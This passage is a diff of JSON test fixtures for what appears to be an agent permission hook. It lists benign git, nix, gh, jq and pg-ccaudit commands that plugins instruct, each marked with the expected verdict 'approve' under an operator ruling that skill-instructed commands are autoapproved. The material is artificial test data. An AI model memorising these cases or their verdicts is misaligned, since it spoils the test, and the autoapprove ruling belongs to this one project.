+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_rev_parse_abbrev_ref_symbolic_fu_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt rev-parse --abbrev-ref --symbolic-full-name @{u}"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_remote_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git -C /repo/.worktrees/wt remote" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_push_u_origin_feature_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt push -u origin feature"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_fetch_origin_feature_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt fetch origin feature"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_rerere_enabled_false_c_repo_worktrees_wt_rebase_ma_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -c rerere.enabled=false -C /repo/.worktrees/wt rebase main"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_rerere_enabled_false_c_repo_worktrees_wt_rebase_or_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -c rerere.enabled=false -C /repo/.worktrees/wt rebase origin/feature"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_push_force_with_lease_u_origin_f_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt push --force-with-lease -u origin feature"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_diff_name_only_diff_filter_u_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt diff --name-only --diff-filter=U"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_checkout_theirs_flake_lock_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt checkout --theirs -- flake.lock"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_add_flake_lock_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git -C /repo/.worktrees/wt add flake.lock" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_rebase_continue_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt rebase --continue"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_rebase_abort_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git -C /repo/.worktrees/wt rebase --abort" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_commit_m_chore_relock_flake_lock_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt commit -m 'chore: relock flake.lock after rebase'"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_status_porcelain_flake_lock_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt status --porcelain -- flake.lock"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_merge_ff_only_feature_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git -C /repo merge --ff-only feature" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_rev_parse_main_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git -C /repo rev-parse main" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_c_repo_worktrees_wt_diff_name_only_main_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git -C /repo/.worktrees/wt diff --name-only main..."
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_diff_name_only_main_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git diff --name-only main..." }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_status_porcelain_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git status --porcelain" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_stash_list_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git stash list" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_worktree_prune_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git worktree prune" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_rebase_continue_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git rebase --continue" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_rebase_abort_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git rebase --abort" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_nix_flake_update_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "nix flake update" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_nix_flake_lock_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "nix flake lock" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_nix_flake_update_nixpkgs_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "nix flake update nixpkgs" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_bgcheck_pg_hooks_refresh_repo_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bgcheck pg-hooks-refresh-repo" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_gh_pr_view_feature_json_url_state_number_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "gh pr view feature --json url,state,number" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_gh_pr_create_draft_head_feature_base_main_fill_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "gh pr create --draft --head feature --base main --fill"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_push_u_origin_feature_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git push -u origin feature" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_integrate_branch_git_push_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "integrate-branch"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git push" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the integrate-branch plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_go_mutate_jq_arg_file_collect_go_argjson_line_95_arg_type_branch_c_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-go-mutate"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "jq --arg file collect.go --argjson line 95 --arg type branch_condition '.statistics' pgm.json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-go-mutate plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_status_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-ccaudit status" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_queries_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-ccaudit queries" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_queries_verbose_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-ccaudit queries --verbose" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_query_error_rate_by_tool_since_2026_07_22_unt_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-ccaudit query error-rate-by-tool --since 2026-07-22 --until 2026-07-30"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_query_session_concentration_sig_since_2026_07_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-ccaudit query session-concentration 'sig' --since 2026-07-22 --until 2026-07-30"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_query_first_seen_sig_since_2026_07_22_until_2_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-ccaudit query first-seen 'sig' --since 2026-07-22 --until 2026-07-30"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_candidates_since_2026_07_22_until_2026_07_30_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-ccaudit candidates --since 2026-07-22 --until 2026-07-30"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_classify_classifier_cli_since_2026_07_22_unti_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-ccaudit classify --classifier cli --since 2026-07-22 --until 2026-07-30 --max 100"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_classify_status_since_2026_07_22_until_2026_0_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-ccaudit classify status --since 2026-07-22 --until 2026-07-30"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_report_classifier_cli_since_2026_07_22_until_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-ccaudit report --classifier cli --since 2026-07-22 --until 2026-07-30 --max 100"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_evaluate_classifier_cli_since_2026_07_22_unti_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "pg-ccaudit evaluate --classifier cli --since 2026-07-22 --until 2026-07-30"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_cost_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-ccaudit cost" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_gold_status_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "pg-ccaudit gold status" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the pg-ccaudit plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_pg_ccaudit_pg_ccaudit_gold_seed_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "pg-ccaudit"],
